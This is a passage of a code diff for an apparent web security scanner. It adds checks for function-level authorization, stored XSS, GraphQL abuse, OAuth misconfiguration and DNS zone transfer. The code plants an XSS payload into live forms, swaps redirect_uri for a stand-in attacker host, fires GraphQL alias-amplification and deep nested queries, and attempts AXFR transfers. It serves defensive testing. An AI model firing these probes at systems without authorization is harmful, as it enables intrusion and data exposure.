+        if p and p not in seen and _BFLA_PATH_RE.search(p):
+            seen.add(p)
+            cands.append(p)
+    auth_b = ctx.opts.get("auth_b") or {}
+    second = None
+    if auth_b:
+        second = _Client(ctx.target, timeout=ctx.client.timeout,
+                         extra_headers=auth_b.get("headers") or {},
+                         cookie=auth_b.get("cookie", ""))
+        second.proxy = ctx.client.proxy
+    anon = _Client(ctx.target, timeout=ctx.client.timeout)
+    anon.proxy = ctx.client.proxy
+    rows = []
+    for path in cands[:12]:
+        if ctx.cancelled():
+            break
+        rp = ctx.client.get(path)
+        vp = _bfla_access(rp, ctx)
+        row = {"function": path, "primary_status": rp.status,
+               "primary": vp, "second_status": None, "second": None,
+               "anonymous_status": None, "anonymous": None,
+               "verdict": "not reachable by the primary session"}
+        if vp == "granted":
+            ra = anon.get(path)
+            va = _bfla_access(ra, ctx)
+            row["anonymous_status"], row["anonymous"] = ra.status, va
+            rb = second.get(path) if second else None
+            if rb is not None:
+                row["second_status"] = rb.status
+                row["second"] = _bfla_access(rb, ctx)
+            sim_a = similarity(ra.body, rp.body) if va == "granted" else 0.0
+            sim_b = similarity(rb.body, rp.body) \
+                if (rb is not None and row["second"] == "granted") else 0.0
+            if row["second"] == "granted" and sim_b >= 0.85 \
+                    and va == "denied":
+                row["verdict"] = ("BFLA: second identity granted with "
+                                  "equivalent content, anonymous denied")
+                add(F("HIGH", f"BFLA: privileged function accessible to a low-privilege account: {path}",
+                      'The function answers the second (low-privilege) credential set with content equivalent to the primary session, while unauthenticated access is denied — function-level authorization is not enforced per role (Broken Function Level Authorization).',
+                      evidence=f"primary=200 granted, second=200 (similarity {sim_b:.2f}), anonymous={ra.status} denied",
+                      cwe="CWE-862", owasp="A01:2021 Broken Access Control (API5: BFLA)",
+                      cvss=8.1,
+                      remed="Authorize every privileged function against the caller's role on the server, not just the object's owner.",
+                      confidence="confirmed", location=path))
+            elif va == "granted" and sim_a >= 0.85:
+                row["verdict"] = ("publicly reachable: anonymous content "
+                                  "is equivalent — not an authorization "
+                                  "finding")
+            elif va == "granted" and row["second"] == "granted" \
+                    and sim_b >= 0.85:
+                row["verdict"] = ("second identity equivalent, but "
+                                  "anonymous is granted too — treated "
+                                  "as public, not confirmed")
+            elif va == "granted":
+                row["verdict"] = ("anonymous granted with different "
+                                  "content than the primary session")
+                add(F("MEDIUM", f"Privileged function reachable without authentication: {path}",
+                      'An unauthenticated request is granted a response at a privileged-function path. Its content differs from the authenticated session view, so this is reported as probable — verify whether the anonymous view exposes privileged data or actions.',
+                      evidence=f"primary=200 granted, anonymous=200 granted (similarity {sim_a:.2f})",
+                      cwe="CWE-862", owasp="A01:2021 Broken Access Control (API5: BFLA)",
+                      cvss=6.5,
+                      remed="Require authentication and role authorization on privileged functions.",
+                      confidence="probable", location=path))
+            else:
+                row["verdict"] = ("healthy: only authenticated sessions "
+                                  "are granted")
+        rows.append(row)
+    if not auth_b:
+        ctx.L("  [bfla] second credential set not supplied — the "
+              "function matrix is partial (primary vs anonymous only); "
+              "cross-account BFLA is not evaluated")
+    ctx.check_meta["bfla_matrix"] = rows
+    ctx.L(f"  [bfla] matrix recorded for {len(rows)} "
+          "privileged-function candidate(s)")
+
+
 _PRIV_FIELDS = {"role": "admin", "is_admin": True, "isAdmin": True,
                 "admin": True, "verified": True, "balance": 1000000,
                 "account_type": "admin"}
@@ -2560,11 +3973,16 @@ _VERIFY_HDR = {"X-Requested-With": "VanthexVerify"}
 
 
 def c_stored_xss(ctx, add):
-    """Stored XSS: tanam payload marker unik ke form POST non-auth, lalu
-    buktikan payload tampil MENTAH pada GET segar halaman lain — respons
-    POST sendiri tidak pernah dihitung (itu reflected, bukan stored).
-    Gerbang soft-404 pada respons POST membuat check ini mati total di
-    aplikasi SPA catch-all (regresi v3.2 tidak boleh terulang)."""
+    """Stored XSS (WS2 v1.4.0): plant a marker-sandwich payload into
+    non-auth POST forms, then prove it on a FRESH GET of a retrieval
+    page with a BASELINE DIFF — the payload occurrence count after
+    planting must exceed the count captured BEFORE planting (a page
+    that already contained the payload proves nothing), AND the parsed
+    DOM must show the marker in an executable position (xssverify);
+    increased-but-inert renderings are probable 'position not
+    confirmed'. The POST response itself never counts (that would be
+    reflected, not stored). The soft-404 gate keeps this check inert
+    on SPA catch-alls (the v3.2 regression must not recur)."""
     surf = ctx.surface(full=True)
     forms = [f for f in surf.forms
              if (f.get("method") or "GET").upper() == "POST"]
@@ -2599,10 +4017,8 @@ def c_stored_xss(ctx, add):
             if _k not in _known:
                 forms.append(_f)
                 _known.add(_k)
-    planted = []
+    plantable = []
     for form in forms:
-        if len(planted) >= 5:
-            break
         action = form.get("action") or form.get("page") or "/"
         low = action.lower()
         if any(k in low for k in ("login", "signin", "sign-in", "auth",
@@ -2612,10 +4028,41 @@ def c_stored_xss(ctx, add):
                   if isinstance(i, str) and i
                   and not any(k in i.lower() for k in
                               ("pass", "email", "token", "csrf", "file"))]
-        if not inputs:
-            continue
-        marker = f"vx{ctx.marker}{len(planted)}"
-        payload = f"<svg/onload=alert('{marker}')>"
+        if inputs:
+            plantable.append((form, action, inputs))
+    if not plantable:
+        return
+    # Retrieval pages + BASELINE capture BEFORE anything is planted.
+    pages = []
+    for form, action, _inputs in plantable:
+        for pg in (form.get("page"), action):
+            if pg and pg not in pages:
+                pages.append(pg)
+    for pg in list(surf.pages)[:8]:
+        if pg not in pages:
+            pages.append(pg)
+    pages = pages[:10]
+
+    def _fresh_bodies():
+        out = {}
+        for pg in pages:
+            try:
+                # header probe: memaksa fetch segar (melewati cache klien) —
+                # snapshot lama tidak boleh menutupi bukti stored.
+                r = ctx.client.get(pg, headers=_VERIFY_HDR)
+            except Exception:
+                continue
+            if r.status == 200:
+                out[pg] = r.body or ""
+        return out
+
+    baseline_bodies = _fresh_bodies()
+    marks = ctx.xss_marks()
+    planted = []
+    for form, action, inputs in plantable:
+        if len(planted) >= 5:
+            break
+        payload = f"<svg/onload={marks['inner']}{len(planted)}>"
         data = "&".join(f"{quote(n, safe='')}={quote(payload, safe='')}"
                         for n in inputs[:4])
         try:
@@ -2627,34 +4074,40 @@ def c_stored_xss(ctx, add):
         planted.append((form, action, payload, inputs[0]))
     if not planted:
         return
-    pages = []
-    for form, action, _, _ in planted:
-        for pg in (form.get("page"), action):
-            if pg and pg not in pages:
-                pages.append(pg)
-    for pg in list(surf.pages)[:8]:
-        if pg not in pages:
-            pages.append(pg)
-    bodies = {}
-    for pg in pages[:10]:
-        try:
-            # header probe: memaksa fetch segar (melewati cache klien) —
-            # snapshot sebelum tanam tidak boleh menutupi bukti stored.
-            r = ctx.client.get(pg, headers=_VERIFY_HDR)
-        except Exception:
-            continue
-        if r.status == 200:
-            bodies[pg] = r.body or ""
+    bodies = _fresh_bodies()
     for form, action, payload, first_input in planted:
+        credited = False
         for pg, body in bodies.items():
-            if payload in body:
+            after = xssverify.body_occurrences(body, payload)
+            before = xssverify.body_occurrences(
+                baseline_bodies.get(pg, ""), payload)
+            if after <= before:
+                continue
+            res = xssverify.analyze(200, "text/html", body,
+                                    baseline_bodies.get(pg, ""), marks)
+            if res["verdict"] == "confirmed":
                 add(F("HIGH", f"Stored XSS verified (persistent): {pg}",
-                      'A payload planted through a form is stored by the application and rendered unescaped on a later, separate page view — any visitor of that page executes attacker script in the application origin.',
-                      evidence=f"payload planted via POST form at {action} renders raw on GET {pg}: {payload}",
+                      'A payload planted through a form is stored by the application and rendered on a later, separate page view in an executable position in the parsed DOM ('
+                      + ", ".join(res["kinds"]) + ') — any visitor of that page executes attacker script in the application origin. Credited only because the payload count rose above the pre-plant baseline (baseline diff) — a page that already contained the payload would prove nothing.',
+                      evidence=f"payload planted via POST form at {action}; occurrences on GET {pg}: {before} (baseline) -> {after} (after plant); {res['detail']}",
                       cwe="CWE-79", owasp="A03:2021", cvss=6.5,
                       remed='Encode all user-supplied content on output (context-aware) and validate input; deploy a restrictive Content-Security-Policy as defense in depth.',
                       confidence="confirmed", location=pg, param=first_input))
+                credited = True
                 break
+            if res["verdict"] == "reflected" and res["near_miss"]:
+                add(F("MEDIUM", f"Stored XSS (position not confirmed): {pg}",
+                      'The planted payload is stored and rendered above its pre-plant baseline, but the marker did not reach a proven executable position in the parsed DOM — reported as probable (position not confirmed), never as verified stored XSS.',
+                      evidence=f"payload planted via POST form at {action}; occurrences on GET {pg}: {before} (baseline) -> {after} (after plant); {res['detail']}",
+                      cwe="CWE-79", owasp="A03:2021", cvss=5.4,
+                      remed='Encode all user-supplied content on output (context-aware) and validate input; deploy a restrictive Content-Security-Policy as defense in depth.',
+                      confidence="probable", location=pg, param=first_input))
+                credited = True
+                break
+        if not credited:
+            ctx.L(f"  [stored] payload via {action}: no credited rendering "
+                  "(not stored, encoded on output, or already present in "
+                  "the pre-plant baseline)")
 
 
 def c_prototype_pollution(ctx, add):
@@ -2755,6 +4208,206 @@ def c_jwt_kid_injection(ctx, add):
                           confidence="confirmed", location=ep))
 
 
+_GQL_INTROSPECTION = (
+    "{__schema{queryType{name} types{name kind "
+    "fields{name args{name defaultValue type{kind name ofType{kind name "
+    "ofType{kind name ofType{kind name}}}}} type{kind name ofType{kind "
+    "name ofType{kind name ofType{kind name}}}}}}}}")
+
+_GQL_SENSITIVE = re.compile(
+    r"user|account|customer|member|employee|order|admin|profile|"
+    r"invoice|payment|billing", re.I)
+_GQL_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
+
+
+def _gql_named(tref):
+    """Unwrap NON_NULL/LIST wrappers down to the named type."""
+    t = tref or {}
+    seen = 0
+    while t.get("kind") in ("NON_NULL", "LIST") and t.get("ofType") \
+            and seen < 8:
+        t = t["ofType"]
+        seen += 1
+    return t.get("kind"), t.get("name")
+
+
+def _gql_parse_schema(sch):
+    types = {}
+    for t in sch.get("types") or []:
+        if not isinstance(t, dict) or not t.get("name"):
+            continue
+        fields = {}
+        for f in t.get("fields") or []:
+            if not isinstance(f, dict) or not f.get("name"):
+                continue
+            args = [{"name": a.get("name", ""),
+                     "required": bool(
+                         (a.get("type") or {}).get("kind") == "NON_NULL"
+                         and a.get("defaultValue") is None)}
+                    for a in f.get("args") or []]
+            fields[f["name"]] = {"type": f.get("type") or {},
+                                 "args": args}
+        types[t["name"]] = {"kind": t.get("kind"), "fields": fields}
+    qt = (sch.get("queryType") or {}).get("name", "")
+    if qt not in types:
+        return None
+    return {"queryType": qt, "types": types}
+
+
+def _gql_depth_chain(schema, max_depth):
+    """Longest deterministic chain of object-typed fields starting at
+    the Query type (first field wins; cycles extend the chain, which
+    is exactly the nested-query amplification shape)."""
+    types = schema["types"]
+    qt = schema["queryType"]
+    if qt not in types:
+        return []
+
+    def obj_field(tname):
+        for fname, finfo in types.get(tname, {}).get("fields",
+                                                     {}).items():
+            if fname.startswith("__"):
+                continue
+            k, n = _gql_named(finfo["type"])
+            if k == "OBJECT" and n in types:
+                return fname, n
+        return None, None
+
+    chain, cur = [], qt
+    while len(chain) < max_depth:
+        f, n = obj_field(cur)
+        if not f:
+            break
+        chain.append((cur, f, n))
+        cur = n
+    return chain
+
+
+def _gql_nested_query(chain):
+    q = "__typename"
+    for _t, f, _n in reversed(chain):
+        q = f"{f}{{{q}}}"
+    return "{" + q + "}"
+
+
+def _gql_resolve_path(data, chain):
+    cur = data
+    for _t, f, _n in chain:
+        if isinstance(cur, list):
+            cur = cur[0] if cur else None
+        if not isinstance(cur, dict) or f not in cur:
+            return False
+        cur = cur[f]
+    return cur is not None
+
+
+def _gql_selection(schema, tname):
+    flds = schema["types"].get(tname, {}).get("fields", {})
+    scalars = [fn for fn, fi in flds.items()
+               if _gql_named(fi["type"])[0] in ("SCALAR", "ENUM")][:5]
+    return " ".join(scalars) if scalars else "__typename"
+
+
+def _gql_field_data(client, ep, hdr, fname, selection):
+    """-> (data_value, serialized_snippet) or (None, "") when the
+    field did not return data for this identity."""
+    q = "{" + fname + "{" + selection + "}}"
+    try:
+        r = client.post(ep, data=json.dumps({"query": q}), headers=hdr)
+        parsed = json.loads(r.body or "")
+    except Exception:
+        return None, ""
+    if not isinstance(parsed, dict):
+        return None, ""
+    data = parsed.get("data")
+    if isinstance(data, dict) and data.get(fname) is not None:
+        return data[fname], json.dumps(data[fname])[:2000]
+    return None, ""
+
+
+def _gql_field_authz(ctx, add, ep, hdr, schema):
+    """WS2 (v1.8.0): field-level authorization. The same sensitive
+    field is queried as the primary session, as a second credential
+    set (opts auth_b — the BOLA infrastructure) and anonymously;
+    verdicts rest on the DATA each identity actually receives.
+    Without any credential set, the cross-account differential is
+    recorded as not evaluated — the anonymous probe still stands on
+    its own evidence."""
+    from netclient import Client as _Client
+    qt = schema["queryType"]
+    qfields = schema["types"].get(qt, {}).get("fields", {})
+    cands = []
+    for fname, finfo in qfields.items():
+        if fname.startswith("__") or not _GQL_SENSITIVE.search(fname):
+            continue
+        if any(a["required"] for a in finfo.get("args", [])):
+            continue
+        k, n = _gql_named(finfo["type"])
+        if k != "OBJECT" or n not in schema["types"]:
+            continue
+        cands.append((fname, n))
+    if not cands:
+        ctx.L(f"  [graphql] {ep}: no sensitive no-arg object fields "
+              "in the schema — field authorization not evaluated")
+        return
+    auth_b = ctx.opts.get("auth_b") or {}
+    second = None
+    if auth_b:
+        second = _Client(ctx.target, timeout=ctx.client.timeout,
+                         extra_headers=auth_b.get("headers") or {},
+                         cookie=auth_b.get("cookie", ""))
+        second.proxy = ctx.client.proxy
+    anon = _Client(ctx.target, timeout=ctx.client.timeout)
+    anon.proxy = ctx.client.proxy
+    primary_auth = bool(ctx.opts.get("cookie") or ctx.opts.get("headers"))
+    evaluated = []
+    for fname, tname in cands[:3]:
+        if ctx.cancelled():
+            return
+        sel = _gql_selection(schema, tname)
+        d_prim, _s = _gql_field_data(ctx.client, ep, hdr, fname, sel)
+        d_anon, s_anon = _gql_field_data(anon, ep, hdr, fname, sel)
+        d_sec = None
+        if second is not None:
+            d_sec, _s2 = _gql_field_data(second, ep, hdr, fname, sel)
+        evaluated.append(fname)
+        if d_anon is not None:
+            emails = _GQL_EMAIL_RE.findall(s_anon)
+            if emails or (isinstance(d_anon, list) and len(d_anon) >= 2):
+                add(F("HIGH", f"GraphQL field '{fname}' returns data without authentication: {ep}",
+                      'An anonymous query for a sensitive field returned actual record data (PII-shaped content and/or multiple records) — field-level authorization is missing: this data does not require authentication to read.',
+                      evidence=f"anonymous data: {s_anon[:160]}",
+                      cwe="CWE-862", owasp="API3:2023 Broken Object Property Level Authorization",
+                      cvss=7.5,
+                      remed="Enforce per-field authorization in resolvers; require authentication for data-bearing fields.",
+                      confidence="confirmed", location=ep))
+            else:
+                add(F("MEDIUM", f"GraphQL field '{fname}' accessible without authentication: {ep}",
+                      'An anonymous query returned data for a sensitive-named field. No PII-shaped content was observed in the sampled response, so this stays probable — verify the field is intentionally public.',
+                      evidence=f"anonymous data present: {s_anon[:160]}",
+                      cwe="CWE-862", owasp="API3:2023", cvss=5.3,
+                      remed="Require authentication for data-bearing fields, or document them as public.",
+                      confidence="probable", location=ep))
+        elif second is not None and d_sec is not None \
+                and d_prim is not None and "admin" in fname.lower():
+            add(F("MEDIUM", f"GraphQL admin field '{fname}' readable by a second account: {ep}",
+                  'A second (low-privilege) credential set read an admin-named field that anonymous callers cannot reach — field-level role authorization appears to be missing.',
+                  evidence="primary=data, second=data, anonymous=denied",
+                  cwe="CWE-862", owasp="API5:2023 Broken Function Level Authorization",
+                  cvss=6.5,
+                  remed="Enforce role checks inside resolvers for administrative fields.",
+                  confidence="probable", location=ep))
+    if not auth_b and not primary_auth:
+        ctx.L(f"  [graphql] {ep}: cross-account field authorization "
+              "not evaluated (no credential set supplied); anonymous "
+              "exposure was still tested")
+        ctx.check_meta.setdefault("graphql", {})["field_authz"] = \
+            "anonymous-only (no credential set supplied)"
+    else:
+        ctx.check_meta.setdefault("graphql", {})["field_authz"] = \
+            f"evaluated for fields: {', '.join(evaluated)}"
+
+
 def c_graphql_deep(ctx, add):
     """GraphQL pendalaman: (a) query batching (amplifikasi brute-force/DoS),
     (b) field suggestion leakage (skema bocor dari pesan error walau
@@ -2804,6 +4457,519 @@ def c_graphql_deep(ctx, add):
                       confidence="probable", location=ep))
         except Exception:
             pass
+        # ---- WS2 (v1.8.0): alias amplification — the verdict comes
+        # from the response (aliases actually resolved), never from
+        # the request merely being accepted.
+        try:
+            _aliases = [f"ptka{i}" for i in range(
+                max(10, min(100, int(ctx.opts.get("graphql_aliases",
+                                                  50)))))]
+            _aq = "{" + " ".join(f"{a}:__typename" for a in _aliases) + "}"
+            ar = ctx.client.post(ep, data=json.dumps({"query": _aq}),
+                                 headers=hdr)
+            ap = json.loads(ar.body or "")
+            adata = ap.get("data") or {}
+            resolved = sum(1 for a in _aliases
+                           if adata.get(a) is not None)
+            aerr = json.dumps(ap.get("errors") or "").lower()
+            if resolved >= max(10, int(len(_aliases) * 0.9)):
+                add(F("LOW", f"GraphQL alias amplification accepted: {ep}",
+                      f'A single query carrying {len(_aliases)} aliases of the same field was fully resolved — no alias/complexity cap is enforced, so one HTTP request can multiply resolver work (and batch credential or object probes) far beyond per-request rate limits.',
+                      evidence=f"{resolved}/{len(_aliases)} aliases resolved in one response",
+                      cwe="CWE-770", owasp="API4:2023 Unrestricted Resource Consumption",
+                      cvss=5.3,
+                      remed='Enforce query complexity and alias limits (cost analysis) at the GraphQL layer.',
+                      confidence="probable", location=ep))
+            elif any(k in aerr for k in ("alias", "complexity",
+                                         "too many", "limit")):
+                ctx.L(f"  [graphql] {ep}: alias amplification is "
+                      "limited by the server (healthy)")
+        except Exception:
+            pass
+        # ---- WS2 (v1.8.0): schema-driven depth + field authorization.
+        schema = None
+        try:
+            ir = ctx.client.post(
+                ep, data=json.dumps({"query": _GQL_INTROSPECTION}),
+                headers=hdr)
+            iparsed = json.loads(ir.body or "")
+            sch = (iparsed.get("data") or {}).get("__schema")
+            if isinstance(sch, dict):
+                schema = _gql_parse_schema(sch)
+        except Exception:
+            pass
+        if not schema:
+            ctx.L(f"  [graphql] {ep}: introspection unavailable — "
+                  "query depth and field authorization not evaluated")
+            continue
+        try:
+            maxd = max(4, min(12, int(ctx.opts.get("graphql_max_depth",
+                                                   8))))
+            chain = _gql_depth_chain(schema, maxd)
+            if len(chain) >= 4:
+                dq = _gql_nested_query(chain)
+                dr = ctx.client.post(ep, data=json.dumps({"query": dq}),
+                                     headers=hdr)
+                dp = json.loads(dr.body or "")
+                derr = json.dumps(dp.get("errors") or "").lower()
+                if any(k in derr for k in ("depth", "complexity",
+                                           "too deep", "maximum",
+                                           "limit")):
+                    ctx.L(f"  [graphql] {ep}: query depth/complexity "
+                          f"limit enforced (chain length {len(chain)})")
+                elif isinstance(dp.get("data"), dict) \
+                        and _gql_resolve_path(dp["data"], chain):
+                    add(F("LOW", f"GraphQL query depth not limited (resolved depth {len(chain)}): {ep}",
+                          'A nested query following the schema\'s own object fields was fully resolved, with data at the deepest level — no query depth/complexity limit is enforced (nested-query denial-of-service surface).',
+                          evidence="depth chain resolved with data: "
+                                   + " > ".join(f for _t, f, _n in chain),
+                          cwe="CWE-770", owasp="API4:2023", cvss=5.3,
+                          remed='Enforce a maximum query depth and a complexity budget at the GraphQL layer.',
+                          confidence="probable", location=ep))
+        except Exception:
+            pass
+        _gql_field_authz(ctx, add, ep, hdr, schema)
+
+
+def _oauth_cfg(ctx):
+    for p in ("/.well-known/openid-configuration",
+              "/.well-known/oauth-authorization-server"):
+        r = ctx.client.get(p)
+        if r.status == 200 and r.body and not ctx.is_missing(r):
+            try:
+                cfg = json.loads(r.body)
+            except Exception:
+                continue
+            if isinstance(cfg, dict) and ("issuer" in cfg
+                                          or "authorization_endpoint"
+                                          in cfg):
+                return p, cfg
+    return None, None
+
+
+def c_oauth_sso(ctx, add):
+    """WS4 (v1.8.0): OAuth/OIDC misconfiguration. Two layers, per
+    decision K2: (1) configuration analysis of the discovery document
+    — always possible, verdicts stay at the config tier; (2) live
+    authorize-flow observation, exercised ONLY as far as the flow
+    actually advances anonymously (or with operator test credentials
+    already carried by the scan session). A flow that stops at a
+    login wall is reported as not evaluated, never forced."""
+    cfg_path, cfg = _oauth_cfg(ctx)
+    summary = {"config_found": bool(cfg), "config_path": cfg_path,
+               "flows_tested": 0, "note": ""}
+    if cfg:
+        grants = [str(g) for g in
+                  (cfg.get("grant_types_supported") or [])]
+        rtypes = [str(t) for t in
+                  (cfg.get("response_types_supported") or [])]
+        methods = [str(m) for m in
+                   (cfg.get("token_endpoint_auth_methods_supported")
+                    or [])]
+        if "password" in grants:
+            add(F("MEDIUM", "OAuth password grant (ROPC) enabled",
+                  'The discovery document advertises the Resource Owner Password Credentials grant — credentials flow through the client and phishing/credential-stuffing value rises sharply; the grant is removed from OAuth 2.1 for this reason.',
+                  evidence=f"grant_types_supported={grants}",
+                  cwe="CWE-798", owasp="A07:2021 Identification and Authentication Failures",
+                  cvss=5.3,
+                  remed='Disable the password grant; use authorization code + PKCE for all client types.',
+                  confidence="probable", location=cfg_path))
+        if "implicit" in grants or any("token" in t.split()
+                                        for t in rtypes):
+            add(F("MEDIUM", "OAuth implicit flow advertised",
+                  'The discovery document advertises the implicit flow / token-bearing response types — tokens are delivered through the browser front channel (URLs, history, referrer leakage); OAuth 2.1 removes the implicit flow.',
+                  evidence=f"grant_types_supported={grants}; response_types_supported={rtypes}",
+                  cwe="CWE-359", owasp="A07:2021", cvss=5.3,
+                  remed='Disable implicit response types; use authorization code + PKCE.',
+                  confidence="probable", location=cfg_path))
+        if "none" in methods:
+            add(F("LOW", "OAuth token endpoint allows unauthenticated public clients ('none' auth method)",
+                  'token_endpoint_auth_methods_supported includes "none": public clients can exchange codes without any client authentication — stolen codes are directly redeemable when combined with a redirect or PKCE gap.',
+                  evidence=f"token_endpoint_auth_methods_supported={methods}",
+                  cwe="CWE-798", owasp="A07:2021", cvss=3.7,
+                  remed='Require client authentication at the token endpoint; keep "none" only for PKCE-bound public clients.',
+                  confidence="candidate", location=cfg_path))
+        if ctx.client.scheme == "https":
+            http_eps = [k for k in ("authorization_endpoint",
+                                    "token_endpoint", "jwks_uri")
+                        if str(cfg.get(k, "")).startswith("http://")]
+            if http_eps:
+                add(F("MEDIUM", f"OAuth endpoints served over plain HTTP: {', '.join(http_eps)}",
+                      'The site is served over HTTPS but the discovery document points authorization/token traffic at plain-HTTP endpoints — codes and tokens can be intercepted in transit.',
+                      evidence=f"endpoints: {http_eps}",
+                      cwe="CWE-319", owasp="A02:2021 Cryptographic Failures",
+                      cvss=6.5,
+                      remed='Serve every OAuth endpoint over HTTPS with HSTS.',
+                      confidence="probable", location=cfg_path))
+    # ---- authorize-flow observation (K2 honesty gate)
+    surf = ctx.surface(full=True)
+    auth_urls = []
+    for u in list(surf.param_urls) + list(surf.pages):
+        if u and "authorize" in u and ("response_type=" in u
+                                       or "client_id=" in u) \
+                and u not in auth_urls:
+            auth_urls.append(u)
+    exercised = False
+    for u in auth_urls[:2]:
+        if ctx.cancelled():
+            break
+        parsed = urlparse(u)
+        params = dict(parse_qsl(parsed.query))
+        ru = params.get("redirect_uri", "")
+        if not ru:
+            continue
+
+        def _go(p, _path=parsed.path):
+            q = "&".join(f"{k}={quote(v, safe='')}"
+                         for k, v in p.items())
+            return ctx.client.get(_path + "?" + q)
+
+        base = _go(params)
+        if not (base.status in (301, 302, 303, 307, 308)
+                and base.hdr("location").startswith(ru)):
+            continue          # flow does not advance anonymously
+        exercised = True
+        summary["flows_tested"] += 1
+        if "state" not in params:
+            add(F("LOW", f"OAuth authorize flow proceeds without a state parameter: {parsed.path}",
+                  'The authorization flow advances to the redirect_uri without any state parameter — the callback cannot be bound to the initiating session (login CSRF on the OAuth flow).',
+                  evidence="authorize redirect issued with no state in the request",
+                  cwe="CWE-352", owasp="A01:2021 Broken Access Control",
+                  cvss=4.3,
+                  remed='Require a high-entropy state value and verify it on the callback.',
+                  confidence="candidate", location=parsed.path))
+        else:
+            p2 = {k: v for k, v in params.items() if k != "state"}
+            r2 = _go(p2)
+            if r2.status in (301, 302, 303, 307, 308) \
+                    and r2.hdr("location").startswith(ru):
+                add(F("MEDIUM", f"OAuth state parameter not enforced: {parsed.path}",
+                      'Removing the state parameter does not stop the authorization flow — the server does not verify state, so the callback is not bound to the initiating session (login CSRF).',
+                      evidence="flow advanced to redirect_uri with state removed",
+                      cwe="CWE-352", owasp="A01:2021", cvss=5.4,
+                      remed='Generate state per flow, store it server-side, and reject callbacks without a matching state.',
+                      confidence="probable", location=parsed.path))
+        if "code" in (params.get("response_type", "")).split() \
+                and "code_challenge" not in params:
+            add(F("LOW", f"OAuth code flow observed without PKCE: {parsed.path}",
+                  'The authorization code flow advances without a code_challenge — intercepted codes are redeemable by whoever holds them (no PKCE binding).',
+                  evidence="authorize redirect issued with response_type=code and no code_challenge",
+                  cwe="CWE-347", owasp="A07:2021", cvss=4.3,
+                  remed='Require PKCE (S256) for all clients, including confidential ones.',
+                  confidence="candidate", location=parsed.path))
+        evil = "https://vanthex-probe.invalid/oauth-cb"
+        p3 = dict(params)
+        p3["redirect_uri"] = evil
+        r3 = _go(p3)
+        if r3.status in (301, 302, 303, 307, 308) \
+                and r3.hdr("location").startswith(evil):
+            add(F("HIGH", f"OAuth redirect_uri not validated: {parsed.path}",
+                  'The authorization endpoint redirected the flow to an arbitrary, attacker-supplied redirect_uri — authorization codes (and implicit tokens) can be delivered to an attacker origin, the classic OAuth account-takeover primitive. The verdict is the observed redirect itself.',
+                  evidence=f"tampered redirect_uri accepted; Location: {r3.hdr('location')[:120]}",
+                  cwe="CWE-601", owasp="A01:2021 Broken Access Control",
+                  cvss=8.1,
+                  remed='Register exact redirect URIs and require byte-exact matching; never prefix/substring matching.',
+                  confidence="confirmed", location=parsed.path))
+    if auth_urls and not exercised:
+        summary["note"] = ("authorize flow did not advance "
+                           "anonymously — active flow checks not "
+                           "evaluated (needs operator test "
+                           "credentials, decision K2)")
+        ctx.L(f"  [oauth] {summary['note']}")
+    if not cfg and not auth_urls:
+        summary["note"] = ("no OIDC configuration or authorize flow "
+                           "discovered")
+        ctx.L("  [oauth] no OIDC configuration or authorize flow "
+              "discovered — not evaluated")
+    ctx.check_meta["oauth"] = summary
+
+
+# ------------------------------------------------- WS6a (v1.8.0): AXFR
+
+def _dns_ns_records(domain):
+    """NS hostnames for a zone via dnspython (approved library);
+    [] when the lookup fails — the caller reports not evaluated."""
+    try:
+        import dns.resolver
+    except Exception:
+        return []
+    res = dns.resolver.Resolver()
+    res.timeout = 4
+    res.lifetime = 6
+    try:
+        ans = res.resolve(domain, "NS")
+        return sorted(str(r.target).rstrip(".") for r in ans)
+    except Exception:
+        return []
+
+
+def _dns_a_records(name):
+    try:
+        import dns.resolver
+    except Exception:
+        return []
+    res = dns.resolver.Resolver()
+    res.timeout = 4
+    res.lifetime = 6
+    try:
+        ans = res.resolve(name, "A")
+        return sorted(str(r) for r in ans)
+    except Exception:
+        return []
+
+
+def _axfr_attempt(server, zone, port=53, timeout=6.0):
+    """One zone-transfer attempt over dnspython's wire query.
+    Returns (status, info): "transferred" only when a complete AXFR
+    answer arrived AND includes the zone SOA; record CONTENTS are
+    never kept — counts and record types only."""
+    try:
+        import dns.query
+        import dns.rcode
+        import dns.rdatatype
+    except Exception as e:
+        return "error", {"error": f"dnspython unavailable: {e}"}
+    total, types, soa = 0, {}, False
+    try:
+        for resp in dns.query.xfr(server, zone, timeout=timeout,
+                                  lifetime=timeout + 4.0, port=port):
+            for rrset in resp.answer:
+                total += len(rrset)
+                tname = dns.rdatatype.to_text(rrset.rdtype)
+                types[tname] = types.get(tname, 0) + len(rrset)
+                if rrset.rdtype == dns.rdatatype.SOA:
+                    soa = True
+    except Exception as e:
+        if getattr(e, "rcode", None) is not None:
+            try:
+                if int(e.rcode) == int(dns.rcode.REFUSED):
+                    return "refused", {"error": "server REFUSED the "
+                                                "transfer"}
+            except Exception:
+                pass
+        if "refused" in str(e).lower():
+            return "refused", {"error": str(e)[:100]}
+        return "error", {"error": str(e)[:100]}
+    if total and soa:
+        return "transferred", {"records": total, "types": types}
+    return "error", {"error": "transfer ended without a complete "
+                              "zone (no SOA)"}
+
+
+def c_dns_axfr(ctx, add):
+    """WS6a (v1.8.0): DNS zone transfer (AXFR). The verdict is the
+    transfer itself: a full zone answer to an unauthenticated AXFR
+    request. NS-discovery failure is reported as not evaluated —
+    absence of a transfer is never claimed from a failed lookup."""
+    import ipaddress
+    host = ctx.client.host or ""
+    try:
+        ipaddress.ip_address(host)
+        ctx.L("  [axfr] IP-literal target — zone transfer not "
+              "evaluated (no zone to ask about)")
+        return
+    except ValueError:
+        pass
+    zone = org_domain(host)
+    ns_names = _dns_ns_records(zone)
+    if not ns_names:
+        ctx.L(f"  [axfr] NS lookup for {zone} failed — zone transfer "
+              "not evaluated")
+        ctx.check_meta["axfr"] = {"zone": zone,
+                                  "status": "not evaluated",
+                                  "nameservers": []}
+        return
+    try:
+        port = int(ctx.opts.get("axfr_port", 53))
+    except Exception:
+        port = 53
+    rows = []
+    for ns in ns_names[:3]:
+        if ctx.cancelled():
+            break
+        ips = _dns_a_records(ns)
+        if not ips:
+            rows.append({"ns": ns, "server": "", "status": "unresolved"})
+            continue
+        status, info = _axfr_attempt(ips[0], zone, port=port)
+        row = {"ns": ns, "server": ips[0], "status": status}
+        row.update(info)
+        rows.append(row)
+        if status == "transferred":
+            types_txt = ", ".join(f"{k}x{v}" for k, v
+                                  in sorted(info["types"].items()))
+            add(F("HIGH", f"DNS zone transfer (AXFR) open: {zone} via {ns}",
